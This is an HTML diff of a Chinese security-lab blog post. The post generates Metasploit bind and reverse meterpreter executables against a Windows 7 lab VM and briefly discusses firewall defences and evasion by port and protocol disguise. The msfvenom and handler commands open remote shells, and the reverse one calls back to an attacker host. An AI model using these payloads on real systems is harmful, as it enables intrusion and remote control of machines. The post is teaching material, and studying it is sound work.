@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://leei.site/tags/网络安全/"/>
+    <link rel="canonical" href="https://leei.site/2025/10/28/实战笔记：从msf载荷生成到windows防火墙绕过/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -132,13 +132,15 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Lee&#39;s SecLab">
-<meta property="og:url" content="https://leei.site/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实战笔记：从MSF载荷生成到Windows防火墙绕过">
+<meta property="og:url" content="https://leei.site/2025/10/28/%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0%EF%BC%9A%E4%BB%8EMSF%E8%BD%BD%E8%8D%B7%E7%94%9F%E6%88%90%E5%88%B0Windows%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="Lee&#39;s SecLab">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leei.site/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-10-28T01:31:57.000Z">
+<meta property="article:modified_time" content="2025-10-28T13:21:23.165Z">
 <meta property="article:author" content="lee">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://leei.site/images/redefine-og.webp">
@@ -153,7 +155,7 @@
     
     <title>
         
-            Tag: 网络安全 | lee&#39;s seclab
+            实战笔记：从MSF载荷生成到Windows防火墙绕过 | lee&#39;s seclab
         
     </title>
 
@@ -600,58 +602,277 @@
 			
 
 			<div class="main-content">
-				<div class="page-template-container">
-	
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-	
-	<div class="tag-name">
-    <i class="fa-solid fa-tag"></i>&nbsp;网络安全
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">实战笔记：从MSF载荷生成到Windows防火墙绕过</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/headshots.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">lee</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-10-28 09:31:57</span>
+        <span class="mobile">2025-10-28 09:31:57</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-10-28 21:21:23</span>
+            <span class="mobile">2025-10-28 21:21:23</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
 </div>
-<div class="tag-post-list">
-    
-<div class="archive-list-container">
-    
-        <section class="archive-item mb-spacing-unit last:mb-0">
-            <div class="archive-item-header flex flex-row items-center mb-2">
-                <span class="archive-year font-semibold text-3xl mr-2">2025</span>
-                <span class="archive-year-post-count text-xs md:text-sm font-bold rounded-small bg-third-background-color py-[2px] px-[10px] border border-border-color">1</span>
-            </div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h3 id="正向shell与反向shell的本质区别："><a href="#正向shell与反向shell的本质区别：" class="headerlink" title="正向shell与反向shell的本质区别："></a>正向shell与反向shell的本质区别：</h3><p>bind_tcp是靶机主动连接攻击机的ip与端口，建立shell连接</p>
+<p>reverse_tcp则是靶机等待攻击者连接（但第一步是靶机主动发起连接，然后等待)</p>
+<p>其中前者易受防火墙的影响</p>
+<p>ps：shell就像一个攻击机遥控受害机的遥控器</p>
+<p>这里我们的攻击机是kali——192.168.145.128，目标机是win7——192.168.145.160</p>
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>工具作用</p>
+<p>Msfvenom：生成恶意程序</p>
+<p>Exploit模块：利用漏洞执行</p>
+<p>Multi&#x2F;Handler：接收连接</p>
+<p>数据库模块：扫描结果</p>
+<h3 id="正向连接演示："><a href="#正向连接演示：" class="headerlink" title="正向连接演示："></a>正向连接演示：</h3><p>kali：msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;5555 -f exe -o b_op.exe</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/07b652300c11472cae9acc5b97db2f29.png"
+                     
+                ></p>
+<p>所以：b_op.exe运行后，目标机（win7）的5555端口开启监听</p>
+<p>复制到win7去</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/a3abb186f9174ece9145a44c9e6d2c79.png"
+                     
+                >msfconsole<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp<br>set RHOST 192.168.145.160<br>set LPORT 5555</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/f191a22dd3574b8fbc4b7bbe7641183c.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/b1637a6429474d7e9786c6bbe7eb8378.png"
+                     
+                >run！win7打开恶意文件之后回显成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/1a6ae98a51d14db78ca9251ffbe1bf9d.png"
+                     
+                ></p>
+<h3 id="反向连接演示"><a href="#反向连接演示" class="headerlink" title="反向连接演示"></a>反向连接演示</h3><p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.145.128 LPORT&#x3D;9999 -f exe -o r_op.exe</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/e123e7c0a9bf433f96dc4ca376e6ed56.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/7f61577bc5be4f28bae220d885eade04.png"
+                     
+                ></p>
+<p>其余类比bindshell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/220074431f2a43d99e44949d784016df.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/7c23cb986fa94689be8579a9b7e1d9f9.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/0fa919c559e746ffaa46aa3467714b1d.png"
+                     
+                ></p>
+<h3 id="防火墙加固"><a href="#防火墙加固" class="headerlink" title="防火墙加固"></a>防火墙加固</h3><p>win7</p>
+<p>进入任务管理器把刚才的b_op.exe和r_op.exe结束进程</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/ad4084410ce243629df2643df2ba5dcd.png"
+                     
+                >不再有端口被监听</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/70e8c0500b8846f6bf79dd8fc7a141d9.png"
+                     
+                ></p>
+<h3 id="在真实的渗透测试中，什么场景下更适合使用反向-shel1-什么场景下更适合使用正向-shel1"><a href="#在真实的渗透测试中，什么场景下更适合使用反向-shel1-什么场景下更适合使用正向-shel1" class="headerlink" title="在真实的渗透测试中，什么场景下更适合使用反向 shel1?什么场景下更适合使用正向 shel1?"></a>在真实的渗透测试中，什么场景下更适合使用反向 shel1?什么场景下更适合使用正向 shel1?</h3><p>·如果是初次渗透：​能出内网​默认用反向，因为防火墙对出栈检测比较弱，内网隔离环境用正向<br>·如果有持久化的后门，优先用反向</p>
+<h3 id="仅通过配置出站规则，能否有效防御所有反向连接-为什么"><a href="#仅通过配置出站规则，能否有效防御所有反向连接-为什么" class="headerlink" title="仅通过配置出站规则，能否有效防御所有反向连接?为什么?"></a>仅通过配置出站规则，能否有效防御所有反向连接?为什么?</h3><p>·不能，攻击者可能采用端口欺骗（比如用80，443端口等），协议伪装（比如看起来像DNS域名查询或浏览网页）</p>
+<h3 id="除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击"><a href="#除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击" class="headerlink" title="除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击?"></a>除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击?</h3><p>·使用白名单——只允许特定程序访问，其他一律组织</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 实战笔记：从MSF载荷生成到Windows防火墙绕过</li>
+        <li><strong>Author:</strong> lee</li>
+        <li><strong>Created at
+                :</strong> 2025-10-28 09:31:57</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-10-28 21:21:23
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://leei.site/2025/10/28/实战笔记：从MSF载荷生成到Windows防火墙绕过/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
             
-            <ul class="article-list pl-0 md:pl-8 text-lg leading-[1.5]">
-                
-                    
-                    
-                         <!-- Close the previous LI if not the first item -->
-                        <li class="article-item space-y-2 px-6 pt-10 pb-2 text-xl relative border-l-2 border-border-color" date-is='10-27'>
-                    
-                    <a href="/2025/10/27/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="block w-fit">
-                        <span class="article-title my-0.5 text-2xl">端口转发实操</span>
-                    </a>
-                    
-                
-                </li> <!-- Ensure the last item is properly closed -->
-            </ul>
-        </section>
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/10/27/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">端口转发实操</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
     
 </div>
-</div>
+
+		</div>
+		
+	</div>
+
 	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">实战笔记：从MSF载荷生成到Windows防火墙绕过</div>
+		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91shell%E4%B8%8E%E5%8F%8D%E5%90%91shell%E7%9A%84%E6%9C%AC%E8%B4%A8%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="nav-text">正向shell与反向shell的本质区别：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#msf"><span class="nav-text">msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E6%BC%94%E7%A4%BA%EF%BC%9A"><span class="nav-text">正向连接演示：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%E6%BC%94%E7%A4%BA"><span class="nav-text">反向连接演示</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E5%8A%A0%E5%9B%BA"><span class="nav-text">防火墙加固</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%A8%E7%9C%9F%E5%AE%9E%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%EF%BC%8C%E4%BB%80%E4%B9%88%E5%9C%BA%E6%99%AF%E4%B8%8B%E6%9B%B4%E9%80%82%E5%90%88%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91-shel1-%E4%BB%80%E4%B9%88%E5%9C%BA%E6%99%AF%E4%B8%8B%E6%9B%B4%E9%80%82%E5%90%88%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%90%91-shel1"><span class="nav-text">在真实的渗透测试中，什么场景下更适合使用反向 shel1?什么场景下更适合使用正向 shel1?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%85%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E5%87%BA%E7%AB%99%E8%A7%84%E5%88%99%EF%BC%8C%E8%83%BD%E5%90%A6%E6%9C%89%E6%95%88%E9%98%B2%E5%BE%A1%E6%89%80%E6%9C%89%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E4%B8%BA%E4%BB%80%E4%B9%88"><span class="nav-text">仅通过配置出站规则，能否有效防御所有反向连接?为什么?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%A4%E4%BA%86%E5%9F%BA%E4%BA%8E%E7%AB%AF%E5%8F%A3%E7%9A%84%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%EF%BC%8C%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9B%B4%E9%AB%98%E7%BA%A7%E7%9A%84%E5%8A%A0%E5%9B%BA%E6%89%8B%E6%AE%B5%E5%8F%AF%E4%BB%A5%E9%98%B2%E5%BE%A1%E6%AD%A4%E7%B1%BB%E6%94%BB%E5%87%BB"><span class="nav-text">除了基于端口的防火墙规则，还有哪些更高级的加固手段可以防御此类攻击?</span></a></li></ol>
 
-	<div class="page-template-content markdown-body">
-		
-
-		
-	</div>
-
-	<div class="page-template-comments">
-		
 	</div>
 </div>
-
-<div class="paginator">
-	<span class="page-number current">1</span>
+	</div>
+	
 </div>
-  
 			</div>
 
 			
@@ -729,6 +950,26 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -832,6 +1073,7 @@
         containers: ["#swup"],
     });
 </script>
+
 
 
 
